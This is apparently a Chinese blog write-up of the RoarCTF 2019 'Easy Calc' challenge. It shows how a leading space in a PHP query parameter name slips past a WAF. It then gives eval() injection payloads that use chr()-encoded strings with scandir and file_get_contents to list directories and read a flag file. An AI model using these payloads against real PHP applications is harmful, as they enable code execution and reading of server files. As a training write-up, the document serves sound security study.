---
layout: post
title: [RoarCTF 2019]Easy Calc
categories: [web,php]
---
## 额在PHP里有许许多多的绕过检测的方法，还有数不胜数的执行函数，所以任重道远啊

### 原理1：利用PHP的字符串解析特性

#### 利用PHP的字符串解析特性Bypass

```php
PHP将查询字符串（在URL或正文中）转换为内部$_GET或关联数组$_POST。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。
例如：
/?foo=bar变成Array([foo]=> “bar”)。
/? foo=bar变成Array([foo]=> “bar”)。 //?号后有一个空格
/?+foo=bar变成Array([foo]=> “bar”)。 //?号后有一个+号
```

### 原理2：利用scandir()列出目录和文件,var_dump()用于输出

> scandir()函数返回指定目录中的文件和目录的数组。
scandir(/)相当于ls /
var_dump()相当于echo

### 原理3：利用file_get_contents()读取并输出文件内容

> 例如 file_get_contents(/flag.php)，读取/flag.php的代码

***

#### 做题步骤访问

> /calc.php，发现源码。大概意思是：GET传入一个num，并且对num的值进行黑名单过滤，最后eval()执行
需要绕过waf对num的检测即可

#### 用到原理1：PHP的字符串解析特性。

> ? num=phpinfo();可以显示结果由于php跳过空格解析。

#### 用到原理2：现在来读取有哪些目录了

> ? num=var_dump(scandir(chr(47)))相当于? num=system(ls /)。chr(47)=" / "。

#### 用到原理3：找到flag所在文件名，那就来读文件内容吧。

> ? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))==>>file_get_contents(/f1agg)相当于? num=system(cat /f1agg)

***
